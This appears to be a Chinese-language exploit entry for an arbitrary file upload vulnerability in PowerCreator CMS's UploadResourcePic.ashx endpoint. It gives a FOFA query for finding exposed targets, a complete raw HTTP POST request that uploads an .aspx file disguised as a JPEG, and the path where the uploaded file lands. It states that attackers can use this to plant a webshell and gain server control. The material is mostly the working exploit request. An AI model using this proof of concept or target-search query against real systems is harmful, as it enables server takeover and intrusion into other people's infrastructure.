## PowerCreator接口UploadResourcePic.ashx存在任意文件上传漏洞

PowerCreator接口 UploadResourcePic.ashx存在任意文件上传漏洞。攻击者可利用该漏洞上传webshell，获得服务器权限。

## fofa

```yaml
app="PowerCreator-CMS"
```

![image-20240711194543726](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407111945851.png)

## poc

```yaml
POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1517.3.1 Ddg/17.3.1
Connection: close
Content-Length: 246
Content-Disposition: form-data;name="file1";filename="poc.aspx";
Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
Accept-Encoding: gzip, deflate

-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="111.aspx"
Content-Type: image/jpeg

11111
-----------------------------20873900192357278038549710136--
```

![image-20240711194442981](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407111944029.png)

文件路径 `http://127.0.0.1/ResourcePic/ODM4Mg==.ASPX`

![image-20240711194519399](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407111945443.png)